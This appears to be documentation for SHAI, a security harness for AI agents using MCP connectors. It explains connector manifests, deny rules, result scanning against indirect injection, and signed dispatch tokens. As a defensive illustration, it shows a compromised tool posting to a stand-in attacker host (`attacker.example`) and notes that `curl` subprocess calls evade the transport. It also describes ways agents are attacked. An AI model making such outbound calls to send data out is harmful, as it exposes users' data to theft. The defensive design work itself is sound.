# Connectors and Connectivity

If your agent talks to Slack, GitHub, Notion, Jira, Gmail, PostgreSQL, Stripe, or Google Drive via MCP, SHAI ships **connector manifests** that pre-configure the security surface for each: allowed URLs, per-tool tags, which tools count as writes, and which returned content should always be scanned. You point at the connector by name; the manifest supplies the rest.

For the wire itself, SHAI can enforce a **dispatch-token** protocol — every allowed tool call carries a signed, one-shot, source-bound token that a custom HTTP transport validates on every request. This closes the gap between "the gate said yes" and "what actually went out on the network."

Both features are opt-in and independent. You can use connectors without connectivity, connectivity with hand-rolled sources, or both.

## Tier A connectors

Instead of configuring every field yourself:

```yaml
sources:
  - name: slack_mcp
    transport: mcp
    url: "https://mcp.slack.com/sse"
    tags: [external_mcp, messaging, external]
    allowed_urls:
      - "https://mcp.slack.com/*"
      - "https://slack.com/api/*"
    allowed_methods: [GET, POST]
    # + you'd still need to figure out which tools are risky and tag them correctly
```

Point at a connector by name:

```yaml
sources:
  - name: slack
    connector: slack
    credentials:
      token: "secret://SLACK_BOT_TOKEN"
```

The manifest supplies `url`, `allowed_urls`, `allowed_methods`, source-level tags, and per-tool tags. Operator fields in your config always override manifest defaults, so you can tighten anything you disagree with.

### Available Tier A connectors

| `connector:` | Service | Notable security defaults |
|---|---|---|
| `slack` | Slack | `send_message` blocked |
| `github` | GitHub | `push_files`, `merge_pull_request` blocked and sensitive |
| `notion` | Notion | All writes blocked |
| `jira` | Jira | `delete_issue` sensitive |
| `gmail` | Gmail | Every tool sensitive, send blocked |
| `postgresql` | PostgreSQL | `execute` blocked, every result sensitive |
| `stripe` | Stripe | Every tool sensitive, payment/cancel blocked |
| `google_drive` | Google Drive | `share_file` blocked (exfiltration surface) |

### Per-tool tags are enforced at registration

Connector manifests declare per-tool security metadata. Tools arrive in the registry already tagged correctly — not just with generic source-level tags. So a policy rule like:

```yaml
- id: block_writes_from_external
  match:
    tool_tags: [external_write]
  action: deny
```

catches `slack.send_message` automatically once the Slack connector is active, because the manifest tagged that tool `external_write`. You didn't have to know to tag it.

### Tool results are always scanned

`harness.scan_tool_result(result, ctx)` scans every result. There is no per-tool opt-out, and connectors do not declare one — a tool whose output looks like control-plane data is exactly where an indirect-injection payload arrives unnoticed.

### Overriding connector defaults

Say you use GitHub but you want push access enabled for a specific agent. The manifest blocks `push_files` globally; you allow it in the agent's rules:

```yaml
# agent.yaml
policy_rules:
  - id: allow_push_for_deployer
    match:
      tool_names: [push_files]
    action: allow
```

Agent rules run before harness rules. Agent `allow` beats manifest `deny` at the policy layer — but the tool's `sensitive` tag from the manifest still triggers argument scanning, and if `push_files` is also marked `IRREVERSIBLE`, you still need `human_approved=True` on the context. Layered defence.

## Dispatch tokens and `ShaiTransport`

Once the gate says "yes," what actually goes on the wire? By default, SHAI doesn't know. The tool runs, and if a compromised tool (or LLM-generated code inside a code-execution tool) makes arbitrary outbound requests, the audit trail shows the tool was invoked — but not what it did.

Dispatch tokens close that gap for MCP sources.

### Enable

```yaml
# harness.yaml
connectivity:
  enabled: true
  token_secret: "secret://SHAI_TOKEN_SECRET"    # HMAC-SHA256 signing key
  token_ttl_seconds: 15                          # tokens expire fast
  no_token_policy: permissive                    # permissive | strict
```

`no_token_policy` decides what happens when a request without a token reaches `ShaiTransport`:

- `permissive` — allows untokenised requests through. Useful during rollout, or for connections that legitimately don't carry tokens (SSE handshakes, session init).
- `strict` — rejects anything without a valid token. Correct for production once every path has been verified to issue tokens.

### How it works

On every allowed gate decision, `check_tool_call` issues a `DispatchToken`:

```python
gate = await harness.check_tool_call(tool_name, args, ctx)
# gate.dispatch_token is a signed JWT-like object bound to:
#   - agent_id
#   - tool_name
#   - source_name  (which MCP source this call is destined for)
#   - allowed_urls (from the source's manifest)
#   - allowed_methods
#   - expires_at   (15s by default)
#   - token_id     (UUID nonce for one-time use)
```

Your MCP HTTP client is `ShaiTransport` — an `httpx.AsyncBaseTransport` subclass that:

1. Extracts the token from the outgoing request context.
2. Verifies the signature against `token_secret`.
3. Checks that the request URL matches one of the token's `allowed_urls`.
4. Checks the HTTP method is in `allowed_methods`.
5. Checks the source binding — a token issued for `slack` cannot be used to reach `github`.
6. Checks the nonce hasn't been used before.
7. Injects the `X-Shai-Token` header, forwards the request, and emits a `NetworkAuditEvent`.

Anything that fails validation is refused at the transport layer — the request never reaches the network. If the same token is replayed, the nonce check refuses it.

### What this protects

- A compromised tool implementation that tries to `httpx.post("https://attacker.example/", ...)` — refused at step 3, URL not in `allowed_urls`.
- A tool that was gated for `slack` but tries to reach GitHub's API — refused at step 5, source binding mismatch.
- A replay attack that captures a valid token and reuses it — refused at step 6, nonce spent.
- A token that survives past the tool's return — refused at step 5 in most cases and at step 6 in others; the 15s TTL is a defence in depth.

### What it does not protect

- Non-MCP outbound calls that don't go through `ShaiTransport`. `subprocess.run("curl ...")` in a code-execution tool is invisible. Network egress control at the infrastructure layer is the right place for that.
- SSE handshakes and MCP session initialisation, in `permissive` mode. Move to `strict` once you've confirmed tokens are issued on every path you care about.

## What next

- [testing.md](testing.md) — writing tests that verify your connector + connectivity config
- [errors.md](errors.md) — token-validation exceptions and their meanings
- [`.claude/skills/connectors.md`](../.claude/skills/connectors.md) and [`.claude/skills/connectivity.md`](../.claude/skills/connectivity.md) — full field reference
